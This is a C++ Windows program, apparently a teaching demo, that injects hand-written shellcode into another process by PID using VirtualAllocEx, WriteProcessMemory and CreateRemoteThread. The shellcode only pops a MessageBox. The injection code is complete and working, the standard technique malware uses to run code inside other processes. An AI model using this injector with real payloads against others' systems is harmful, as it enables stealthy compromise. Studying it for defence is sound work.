// This process attempts to inject shellcode into a target process and pops a MessageBox.

#include <Windows.h>
#include <iostream>
#include <string>
#include <assert.h>

using fMessageBoxA = int(WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

struct SC_PARAM
{
	fMessageBoxA MsgBox = nullptr;
	char Text[20]{};
	char Caption[20]{};
};

int main(int argc, char* argv[])
{
	// Checking for arguments.
	if (argc != 2)
	{
		std::string Filename = argv[0];
		printf("Invalid arguments\nUsage: %s PID\n", Filename.substr(Filename.find_last_of("/\\") + 1).c_str());
		return 0;
	}

	// Converting string pid to integer pid.
	DWORD Pid = atoi(argv[1]);
	if (!Pid)
	{
		printf("Invalid PID\n");
		return 0;
	}

	// Getting a handle to the target process so we can access it.
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
	if (!hProcess)
	{
		printf("[!] OpenProcess failed. Err code: 0x%X\n", GetLastError());
		return 0;
	}
	printf("[*] Retrieved handle for target process, 0x%X\n", HandleToULong(hProcess));

#ifdef _WIN64
	BYTE ShellcodeBytes[] = "\x48\x8B\xC1\x4C\x8D\x41\x1C\x48\x8D\x51\x08\x45\x33\xC9\x33\xC9\x48\xFF\x20";
#else
	BYTE ShellcodeBytes[] = "\x6A\x00\x8D\x41\x18\x50\x8D\x41\x04\x50\x8B\x01\x6A\x00\xFF\xD0\xC3";
#endif

	// Allocating memory for our shellcode function + variables.
	PVOID ShellcodeMemory = VirtualAllocEx(hProcess, NULL, sizeof(ShellcodeBytes) + sizeof(SC_PARAM), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShellcodeMemory)
	{
		printf("[!] VirtualAllocEx failed. Err code: 0x%X\n", GetLastError());
		return 0;
	}
	printf("[*] %i bytes of memory allocated inside target process.\n", sizeof(ShellcodeBytes) + sizeof(SC_PARAM));

	do
	{
		// Writing our shellcode into the allocated memory, since this memory is in the target process we must call WriteProcessMemory.
		SIZE_T NumberOfBytesWritten = 0;
		if (!WriteProcessMemory(hProcess, ShellcodeMemory, ShellcodeBytes, sizeof(ShellcodeBytes), &NumberOfBytesWritten))
		{
			printf("[!] WriteProcessMemory failed. Err code: 0x%X\n", GetLastError());
			break;
		}
		printf("[*] shellcode function written into the allocated memory.\n");

		// Setting up the Shellcode params.

		// This shellcode will be inside the target process so we can't just directly call MessageBoxA, we can't even directly pass string literals to any function inside since
		// those string literals will be allocated inside our process.

		SC_PARAM ScParam = {};

		// Getting USER32.DLL handle.
		HMODULE User32Module = LoadLibraryA("USER32.DLL");
		if (!User32Module)
		{
			printf("[!] USER32.DLL couldn't be loaded.\n");
			break;
		}

		// Getting the address of USER32.MessageBoxA, as I said we can't directly call it but if we pass it's address we can.
		ScParam.MsgBox = (fMessageBoxA)GetProcAddress(User32Module, "MessageBoxA");
		if (!ScParam.MsgBox)
		{
			printf("[!] USER32.MessageBoxA couldn't be found.\n");
			break;
		}

		// Copying our "Hi there!" string into the ScParam.Text member.
		const char* Text = "Hi there!";
		memcpy(ScParam.Text, Text, strlen(Text) + 1);

		// Copying our "SHELLCODE" string into the ScParam.Caption member.
		const char* Caption = "SHELLCODE";
		memcpy(ScParam.Caption, Caption, strlen(Caption) + 1);

		// Writing variables just after the shellcode function so we can access them inside the target process.
		if (!WriteProcessMemory(hProcess, (BYTE*)ShellcodeMemory + sizeof(ShellcodeBytes), &ScParam, sizeof(SC_PARAM), &NumberOfBytesWritten))
		{
			printf("[!] WriteProcessMemory failed. Err code: 0x%X\n", GetLastError());
			break;
		}
		printf("[*] shellcode variables written into the allocated memory.\n");

		// Creating a remote thread inside the target process which calls our shellcode (well not our's anymore actually).
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShellcodeMemory, (BYTE*)ShellcodeMemory + sizeof(ShellcodeBytes), NULL, NULL);
		if (!hThread)
		{
			printf("[!] CreateRemoteThread failed. Err code: 0x%X\n", GetLastError());
			break;
		}
		printf("[*] shellcode function called.\n");

		// Waiting the Shellcode thread to finish.
		if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
			printf("[!] WaitForSingleObject failed. Err code: 0x%X\n", GetLastError());

		printf("[*] shellcode function finished.\n");

		// shellcode doesn't return anything so we don't have to check for any return value. 

		CloseHandle(hThread);
		printf("[*] Thread handle released.\n");
	} while (FALSE);

	// Freeing the entire allocated Shellcode memory.
	if (!VirtualFreeEx(hProcess, ShellcodeMemory, 0, MEM_RELEASE))
	{
		printf("[!] VirtualFreeEx failed. Err code: 0x%X\n", GetLastError());
		return 0;
	}
	printf("[*] Allocated memory released.\n");

	CloseHandle(hProcess);
	printf("[*] Process handle released.\n");
}